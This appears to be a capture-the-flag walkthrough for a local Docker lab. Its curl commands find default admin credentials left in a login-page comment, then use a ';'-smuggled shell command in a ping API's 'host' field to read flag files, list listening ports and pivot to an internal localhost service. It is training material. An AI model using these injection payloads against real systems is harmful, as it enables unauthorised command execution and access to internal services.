# Walkthrough

This document gives the complete solution. Work through the docs first.

## Setup

```bash
docker compose up --build -d
```

Wait 10 to 20 seconds for the container to start, then verify:

```bash
curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:8081/
```

Expected: `302` (redirect to login).

## Step 1: discover the credentials

Read the login page source:

```bash
curl -s http://127.0.0.1:8081/login | grep -i 'credential\|admin\|password\|<!--'
```

Output:

```html
<!-- default credentials: admin / monitor123 -->
```

## Step 2: log in

```bash
curl -c /tmp/jar -sf -X POST http://127.0.0.1:8081/login \
  -d "username=admin&password=monitor123" -o /dev/null -w "%{http_code}"
```

Expected: `302`. The cookie jar now contains `auth=1`.

## flag1: command injection

```bash
curl -b "auth=1" -s -X POST http://127.0.0.1:8081/api/ping \
  -H "Content-Type: application/json" \
  -d '{"host":"127.0.0.1;cat /flag1.txt"}'
```

**flag1** is the `POC{...}` value in the output field.

## Discover the internal service

```bash
curl -b "auth=1" -s -X POST http://127.0.0.1:8081/api/ping \
  -H "Content-Type: application/json" \
  -d '{"host":"127.0.0.1;ss -tlnp"}'
```

Port 9090 is listed as bound to `127.0.0.1`.

## flag2: internal pivot

```bash
curl -b "auth=1" -s -X POST http://127.0.0.1:8081/api/ping \
  -H "Content-Type: application/json" \
  -d '{"host":"127.0.0.1;curl -s http://127.0.0.1:9090/"}'
```

**flag2** is the `POC{...}` value at the end of the output.

## Automated

```bash
python3 exploit/exploit.py
```

## Teardown

```bash
docker compose down
```
